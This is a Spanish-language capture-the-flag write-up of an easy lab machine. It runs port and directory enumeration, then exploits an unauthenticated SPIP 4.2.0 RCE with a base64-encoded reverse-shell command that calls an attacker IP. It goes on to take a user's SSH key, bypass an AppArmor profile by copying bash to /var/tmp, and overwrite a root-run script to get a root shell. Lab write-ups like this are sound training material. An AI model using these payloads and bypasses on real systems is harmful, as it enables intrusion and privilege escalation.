## Resumen 
Es una máquina de dificultad fácil en la que se explota un blind RCE en la web para el acceso inicial, se consigue una clave SSH de un usuario y se acaba escalando a root modificando un script con SUID.

## Enumeración

Empiezo haciendo un ping a la máquina para saber, por el TTL, qué SO usa.

`ping -c 1 vmip`
`64 bytes from vmip: icmp_seq=1 ttl=62 time=29.7 ms`

Sigo con nmap enumerando los puertos.

`nmap -sVC -p- --min-rate 5000  vmip   -oG nmap`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:d4:55:39:3d:f3:7d:5c:99:96:17:90:27:9b:86:ee (RSA)
|   256 cb:f9:bd:4f:f8:c4:c2:9f:5d:38:7b:e9:b7:e0:9c:61 (ECDSA)
|_  256 a9:57:7f:13:47:e1:21:d1:f4:35:46:42:97:f0:80:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Puertos encontrados.

`22/SSH Apache/80`

## Análisis puerto 80

Empiezo con un curl a la página para verlo todo detalladamente.

`curl 10.130.185.140`

Entro a la página y no veo nada interesante ya que no hay nada para interactuar, así que sigo enumerando directorios con gobuster.

```
gobuster dir -u http://vmip     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vmip
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 317] [--> http://vmip/images/]
spip                 (Status: 301) [Size: 315] [--> http://vmip/spip/]
```

Veo que hay un directorio interesante `/spip`, así que le hago un curl.

`curl http://vmip/spip`

Veo que solo es una página sin nada interactuable, así que sigo investigando.

Veo en Wappalyzer la versión de SPIP.

`SPIP 4.2.0`

Decido buscarlo en searchsploit.

`searchsploit SPIP 4.2.0`

```
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                                                                                 | php/webapps/51536.py
```

Veo que tiene una vulnerabilidad blind RCE con exploit, así que decido descargarlo.

`searchsploit -m php/webapps/51536.py` 

Me pongo a escuchar el puerto 4444.

`nc -lvnp 4444`

Mando el exploit.

`python3 51536.py -u http://vmip/spip/ -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xNDcvNDQ0NCAwPiYx | base64 -d | bash"`

Y entramos como el usuario `www-data`.

## Escalada de privilegios

Empiezo con `sudo -l`

`sudo -l`

```
sudo -l
bash: sudo: command not found
```

Lo descarto.

Sigo buscando binarios SUID.

`find / -perm -4000 2>/dev/null`
```
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
```

Son los SUID estándar.

Me doy cuenta de que estamos en el home del usuario `think`, encontrando así la flag en `user.txt`.

Encuentro su clave SSH en `.ssh`. La copio en mi máquina e inicio sesión como el usuario think.

`ssh -i id_rsa think@10.130.185.140`

Ahora, como el usuario think, empiezo con los binarios SUID, ya que `sudo -l` no me deja por falta de contraseña.

`find / -perm -4000 2>/dev/null`
```
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

Aquí veo uno extraño: `/usr/sbin/run_container`.

Lo ejecuto y veo que es para gestionar contenedores; cuando el id falla, sale un error.

`/opt/run_container.sh: line 16: validate_container_id: command not found`

Decido comprobar los permisos de ese script.

`ls -la /opt/run_container.sh`
`-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh`

Visto esto, procedo a poner el payload en el `.sh`.

`echo "/bin/sh -p" > /opt/run_container.sh`
`-ash: /opt/run_container.sh: Permission denied`

Veo que no puedo escribir en el archivo aunque sí tengo permisos, algo bastante raro.

Leo la pista y dice que miremos AppArmor.

Empiezo viendo el archivo de AppArmor.

`cat /etc/apparmor.d/usr.sbin.ash`

Entro a este archivo ya que es lo que se aplica al usuario, y como el usuario usa la shell ash, que se puede ver con:

`echo $0`

```
/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```

Pone que podemos ejecutar `/usr/bin/bash` para cambiar la shell, pero el perfil de `usr.sbin.ash` seguirá siendo aplicado al nuevo proceso de la shell, así que seguirá sin poder reescribir el script.

Pero se sigue pudiendo bypassear ejecutando la shell en cualquier otro directorio fuera de donde se apliquen las configuraciones de `mrix`.

Empiezo copiando la shell a otro directorio.

`cp /usr/bin/bash /var/tmp/bash`

Ejecuto la shell para poder escribir en el script.

`/var/tmp/bash`

Reescribo el script.

`echo "/bin/sh -p" > /opt/run_container.sh`

Lo ejecuto.

`/usr/sbin/run_container`

Compruebo.

```
# id                                         
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```

Y voy a `/root` para leer la flag.

`cat root.txt`

## Flujo de ataque

1. Enumeración.
	Se encuentra un Apache y un SSH expuestos.
2. Análisis puerto 80.
	Se encuentra un subdirectorio `/spip` vulnerable a RCE.
3. Acceso inicial.
	Se consigue el acceso a `www-data` vía el RCE.
4. Escalada de privilegios.
	Se encuentra una clave SSH del usuario en el directorio `/home`.
	Se encuentra un SUID sospechoso que ejecuta un script que se modifica ejecutando una shell fuera de las configuraciones de `mrix`.